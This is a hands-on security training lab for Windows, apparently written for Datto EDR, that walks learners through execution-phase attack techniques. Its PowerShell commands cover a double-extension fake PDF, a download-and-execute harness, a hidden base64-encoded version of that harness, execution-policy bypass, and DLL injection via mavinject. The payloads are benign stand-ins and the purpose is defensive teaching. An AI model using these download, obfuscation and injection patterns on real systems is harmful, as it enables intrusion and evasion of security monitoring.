---
Title: ATT&CK - Execution Phase
Description: Demonstrate the execution phase of an attack
Author: Chris Gerritz, Datto
Created: 04/07/2025
Achievements:
Duration: 20
Range:
- Windows
Applications:
- Terminal (Command prompt)
- PowerShell
- Datto EDR
- SysInternals
- Office
- Adobe Reader
External:
- attack.mitre.org
- allitshop.infocyte.com
- live.sysinternals.com/psexec.exe
- github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll
---

## Description

The purpose of these labs is to introduce post-compromise attack behaviors and EDR defenses. 

Lab 2 will demonstrate a post-compromise execution phase of an attack where initial exploits have already granted privileged access to the target system and now you need to execute some commands and download/execute additional malware payloads.

Typically, the 'Initial Execution' will be a very small command called a download harness and this is executed in one of two ways:
1. Via an exploit of a vulnerable application
2. Via an internal user through social engineering

In order to grant the attacker additional functionality such as recon, lateral movement or ransomware staging, they will need to inject a more feature rich malware type called a Remote Access Tool (aka a "RAT") following that initial execution. This follow on execution will utilize administrative commands which we can detect during behavioral monitoring.

---

## Objectives
<!--
- List all objectives for this lab
- Need at least three objectives
- Use blooms taxonomy verbs: KNOWLEDGE,UNDERSTAND, APPLY, ANALYZE, EVALUATE, CREATE
- https://www.teachthought.com/critical-thinking/blooms-taxonomy-verbs-2/
-->
1. Understand the initial steps of an attack that uses staged malware
2. Demonstrate some execution techniques to get initial trojans or follow-on malware payloads to run

## Requirements

|                  |                             |
|------------------|-----------------------------|
| **Range**        | Windows |
| **Applications** | All applications needed     |
| **Needed Files** | None |


## Preparation Instructions

Ignore this if you already ran it in a previous lab and are re-using the same Powershell window.

1. Open powershell as an administrator
	- Right click Powershell
	- Click "Run as Administrator"
2. Prepare the enviroment with some variables we will use later
	- Copy and paste this command into the terminal:
	```PowerShell
	#Define a random number (This will be used to force Datto EDR not to deduplicate repeated commands during testing)
	$n = 1000+$(Get-Random -Max 999)
	# Bypass signed script controls
	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

	```
-----
## Instructions

For each of these labs, you will need your Powershell window open. You can use the same window for all labs. You will be copying and pasting commands into the terminal and then evaluating the output.

w> All labs require you to be running as an administrator. 



### 1. Double Extension Execution
> *Initial execution is often through a social engineering attack. This first technique hides an executable as a pdf file. The hope is the user will download this file and double click it to see what it is. When they do, our trojan will execute and give us a (simulated) callback where we can tell it to run additional commands.*

Execute a file with a **Double Extension**. 
- MITRE ATT&CK Technique: [ATT&CK T1204.002 - Execution - User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002)
- MITRE ATT&CK Technique: [ATT&CK T1036.007 - Evasion - Masquerading: Double File Extension](https://attack.mitre.org/techniques/T1036/007)
- Copy and paste this command into the terminal:
	```PowerShell
	# Double Extension
	Write-Host -ForegroundColor Cyan "Initiating a T1204.002 - Malicious File Extension with Double Extension evasion"
	$MalwarePath = "C:\Windows\System32\calc.exe"
	$TrojanPath = "$Env:USERPROFILE\Desktop\freemoney.pdf.exe"

	Copy-Item -Path $MalwarePath -Destination $TrojanPath -Force
	Get-Item $TrojanPath
	Write-Host -ForegroundColor Cyan "Go ahead and double click freemoney.pdf on your desktop"
	```
- Next, go to your desktop and double click freemoney.pdf and see what happens.


### 2. Powershell Download Harness
> *The following method is used by some malware to download and execute an additional file using Powershell. This is the simplest way to do this and often used legitimatly so the technique can blend the malicious action in with existing noise produced by admins.*

Execute a simple **Powershell Download Harness**. 
- MITRE ATT&CK Technique: [ATT&CK T1059.001 - Execution - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/001)
- Copy and paste this command into the terminal:
	```PowerShell
	# Powershell Download Hardness
	Write-Host -ForegroundColor Cyan "Initiating a T1059.001 - Powershell Download Harness"
	$url = "https://live.sysinternals.com/psexec.exe"
	$filename = "$env:TEMP\bad.exe"

	$cmd = "(new-object System.Net.WebClient).DownloadFile('$url', '$filename'); Start-Sleep -m $n"
	Write-Host -ForegroundColor Cyan "Running Command:"
	Write-Host -ForegroundColor Green "Powershell.exe -command '$cmd'"
	Powershell.exe -command $cmd

	Get-Item $filename
	```


### 3. Hidden & Encoded Powershell Download Harness
> *Most attackers aren't going to want you seeing the command or the powershell window poping up so they will use obfuscation and stealth techniques with this.*

Execute it again, but this time as a **Hidden & Encoded Powershell Download Harness**. 
- MITRE ATT&CK Technique: [ATT&CK T1059.001 - Execution - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/001)
- MITRE ATT&CK Technique: [ATT&CK T1027 - Evasion - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)
- Copy and paste this command into the terminal:
	```PowerShell
	# Encoded and Hidden Powershell Download Harness
	Write-Host -ForegroundColor Cyan "Initiating a T1059.001 - Powershell Encoded and hidden Download Harness"
	$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Cmd)
	)
	Write-Host -ForegroundColor Cyan "Running Command:"
	Write-Host -ForegroundColor Green "powershell.exe -win H -NoP -e '$EncodedCommand'"
	powershell.exe -win H -NoP -e $EncodedCommand
	```

w> This will hide your browser, you may need to open a new browser after performing this command.


### 4. System Binary Proxy Execution
> *One method to evade antivirus is to force a legitimate system application to run the attacker's code/malware on the attacker's behalf. A common method is to inject the malware's code as a library into the memory of a system process.*
>
> *The method we'll demonstrate today is a Microsoft utility called `mavinject`.  Mavinject.exe is the **Microsoft Application Virtualization Injector**, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V). This utility is installed by default on most modern Windows versions but shouldn't really be used unless App-V is in use.*

1. Use mavinject.exe to perform a **System Binary Proxy Execution** technique
- [ATT&CK T1218.013 - Defense Evasion - Signed Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/013)
- [ATT&CK T1055.001 - Defense Evasion - Process Injection: Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)
- Copy and paste this command into the terminal:
	```PowerShell
	$n = 1000+$(Get-Random -Max 999)
	# Signed Binary Proxy Execution w/ mavinject.exe
	Write-Host -ForegroundColor Cyan "Initiating a T1218.013 - Signed Binary Proxy Execution using mavinject.exe"
	$malwareURL = "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll"
	# start and inject into notepad or calc
	$targetProcessName = "notepad"
	$cmd = @"
		`$targetProcessId = (Start-Process $targetProcessName -PassThru).id
		Invoke-WebRequest $malwareURL -OutFile "$env:temp\T1055.001.dll"
		mavinject `$targetProcessId /INJECTRUNNING $env:temp\T1055.001.dll
		Start-Sleep -m $n
	"@
	powershell.exe -nop -command $cmd
	```

	s> If you are successful, the code we are injecting will force notepad to run a popup that says "Locked and Loaded".